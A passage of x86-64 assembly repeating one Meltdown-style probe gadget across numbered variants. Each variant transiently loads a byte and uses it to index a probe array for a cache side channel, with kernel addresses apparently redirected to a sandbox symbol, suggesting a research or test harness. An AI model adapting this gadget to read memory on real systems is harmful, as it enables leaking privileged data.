## Variant 75
.Lprobe_one_win0_var75:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 76
.Lprobe_one_win0_var76:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 77
.Lprobe_one_win0_var77:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 78
.Lprobe_one_win0_var78:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 79
.Lprobe_one_win0_var79:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 80
.Lprobe_one_win0_var80:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 81
.Lprobe_one_win0_var81:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 82
.Lprobe_one_win0_var82:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 83
.Lprobe_one_win0_var83:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 84
.Lprobe_one_win0_var84:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 85
.Lprobe_one_win0_var85:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 86
.Lprobe_one_win0_var86:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 87
.Lprobe_one_win0_var87:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 88
.Lprobe_one_win0_var88:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 89
.Lprobe_one_win0_var89:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 90
.Lprobe_one_win0_var90:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 91
.Lprobe_one_win0_var91:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 92
.Lprobe_one_win0_var92:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 93
.Lprobe_one_win0_var93:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 94
.Lprobe_one_win0_var94:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 95
.Lprobe_one_win0_var95:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 96
.Lprobe_one_win0_var96:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 97
.Lprobe_one_win0_var97:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 98
.Lprobe_one_win0_var98:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 99
.Lprobe_one_win0_var99:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 100
.Lprobe_one_win0_var100:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 101
.Lprobe_one_win0_var101:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 102
.Lprobe_one_win0_var102:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 103
.Lprobe_one_win0_var103:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 104
.Lprobe_one_win0_var104:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 105
.Lprobe_one_win0_var105:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 106
.Lprobe_one_win0_var106:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 107
.Lprobe_one_win0_var107:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 108
.Lprobe_one_win0_var108:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 109
.Lprobe_one_win0_var109:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 110
.Lprobe_one_win0_var110:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 111
.Lprobe_one_win0_var111:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 112
.Lprobe_one_win0_var112:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 113
.Lprobe_one_win0_var113:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 114
.Lprobe_one_win0_var114:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 115
.Lprobe_one_win0_var115:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 116
.Lprobe_one_win0_var116:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 117
.Lprobe_one_win0_var117:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 118
.Lprobe_one_win0_var118:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 119
.Lprobe_one_win0_var119:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 120
.Lprobe_one_win0_var120:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 121
.Lprobe_one_win0_var121:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 122
.Lprobe_one_win0_var122:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 123
.Lprobe_one_win0_var123:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 124
.Lprobe_one_win0_var124:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 125
.Lprobe_one_win0_var125:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 126
.Lprobe_one_win0_var126:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 127
.Lprobe_one_win0_var127:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 128
.Lprobe_one_win0_var128:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 129
.Lprobe_one_win0_var129:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 130
.Lprobe_one_win0_var130:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 131
.Lprobe_one_win0_var131:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 132
.Lprobe_one_win0_var132:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 133
.Lprobe_one_win0_var133:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 134
.Lprobe_one_win0_var134:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 135
.Lprobe_one_win0_var135:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 136
.Lprobe_one_win0_var136:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 137
.Lprobe_one_win0_var137:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 138
.Lprobe_one_win0_var138:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 139
.Lprobe_one_win0_var139:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 140
.Lprobe_one_win0_var140:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 141
.Lprobe_one_win0_var141:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 142
.Lprobe_one_win0_var142:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 143
.Lprobe_one_win0_var143:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 144
.Lprobe_one_win0_var144:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 145
.Lprobe_one_win0_var145:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 146
.Lprobe_one_win0_var146:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 147
.Lprobe_one_win0_var147:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 148
.Lprobe_one_win0_var148:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 149
.Lprobe_one_win0_var149:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 150
.Lprobe_one_win0_var150:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 151
.Lprobe_one_win0_var151:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 152
.Lprobe_one_win0_var152:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 153
.Lprobe_one_win0_var153:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 154
.Lprobe_one_win0_var154:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 155
.Lprobe_one_win0_var155:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 156
.Lprobe_one_win0_var156:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 157
.Lprobe_one_win0_var157:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 158
.Lprobe_one_win0_var158:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 159
.Lprobe_one_win0_var159:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 160
.Lprobe_one_win0_var160:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
